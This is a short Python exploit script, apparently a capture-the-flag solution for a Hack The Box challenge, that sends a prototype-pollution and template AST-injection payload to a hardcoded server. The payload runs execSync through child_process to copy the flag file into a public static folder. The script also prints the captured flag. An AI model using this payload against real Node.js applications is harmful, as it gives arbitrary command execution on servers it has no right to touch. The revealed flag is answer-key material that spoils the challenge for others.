import requests
import json

# template injection:
# https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68
def main():
    URL = 'http://188.166.175.58:31870/' + 'api/submit'
    r = requests.session()
    resp = r.post(url=URL,
                  json = {
            "artist.name": "Haigh",
            "__proto__.block": { 
                "type": "Text", 
                "line": "process.mainModule.require('child_process').execSync('cat /app/flag* > /app/static/out')" 
            }
        }
    )
    
    print(resp.text)
    print(resp.status_code)

if __name__ == "__main__":
    # Flag: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}
    main()
